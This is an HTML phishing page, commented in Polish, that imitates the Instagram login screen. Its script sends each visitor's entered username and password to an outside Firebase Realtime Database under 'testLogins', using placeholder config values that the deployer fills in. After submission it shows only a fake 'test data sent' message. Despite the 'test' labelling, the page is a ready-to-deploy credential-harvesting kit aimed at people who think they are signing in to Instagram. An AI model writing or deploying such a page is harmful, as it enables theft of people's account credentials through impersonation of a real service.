<!DOCTYPE html>
<html lang="pl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram Test Login</title>
<style>
  /* Body */
  body {
    font-family: Arial, sans-serif;
    background: #fafafa;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    margin: 0;
  }

  /* Kontener logowania */
  .login-container {
    background: #fff;
    border: 1px solid #dbdbdb;
    padding: 40px 30px;
    width: 90%;
    max-width: 380px;
    text-align: center;
    border-radius: 8px;
    box-sizing: border-box;
  }

  /* Logo Instagram */
  .logo {
    font-family: 'Grand Hotel', cursive;
    font-size: 48px;
    color: #262626;
    margin-bottom: 20px;
  }

  /* Formularz */
  input {
    width: 100%;
    padding: 12px;
    margin: 5px 0;
    font-size: 14px;
    border: 1px solid #dbdbdb;
    border-radius: 4px;
    background: #fafafa;
    box-sizing: border-box;
  }

  button {
    width: 100%;
    padding: 12px;
    margin-top: 10px;
    background: linear-gradient(to right, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
    color: #fff;
    border: none;
    border-radius: 4px;
    font-weight: bold;
    cursor: pointer;
    font-size: 14px;
  }

  button:hover {
    opacity: 0.9;
  }

  /* Komunikat po wysłaniu */
  #successMessage {
    color: green;
    margin-top: 10px;
    display: none;
    font-size: 14px;
  }

  /* Responsywność */
  @media (max-width: 500px) {
    .login-container {
      padding: 30px 20px;
    }
    input, button {
      padding: 10px;
      font-size: 13px;
    }
    .logo {
      font-size: 36px;
    }
  }
</style>
<link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
</head>
<body>

<div class="login-container">
  <div class="logo">Instagram</div>
  <form id="loginForm">
    <input type="text" id="username" placeholder="Numer telefonu, użytkownik lub email" required>
    <input type="password" id="password" placeholder="Hasło" required>
    <button type="submit">Zaloguj się</button>
  </form>
  <div id="successMessage">Testowe dane wysłane!</div>
</div>

<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
<script>
  // PODMIEN NA SWÓJ KOD Z FIREBASE
  const firebaseConfig = {
    apiKey: "TWOJE_API_KEY",
    authDomain: "TWOJ_PROJEKT.firebaseapp.com",
    databaseURL: "https://TWOJ_PROJEKT-default-rtdb.firebaseio.com",
    projectId: "TWOJ_PROJEKT",
    storageBucket: "TWOJ_PROJEKT.appspot.com",
    messagingSenderId: "TWOJE_ID",
    appId: "TWOJE_APP_ID"
  };

  firebase.initializeApp(firebaseConfig);
  const database = firebase.database();

  const form = document.getElementById('loginForm');
  const successMessage = document.getElementById('successMessage');

  form.addEventListener('submit', (e) => {
    e.preventDefault();
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // Zapis testowych danych do Firebase
    database.ref('testLogins').push({
      username,
      password,
      timestamp: Date.now()
    });

    form.reset();

    // Pokaż delikatny komunikat
    successMessage.style.display = 'block';
    setTimeout(() => {
      successMessage.style.display = 'none';
    }, 3000);
  });
</script>

</body>
</html>
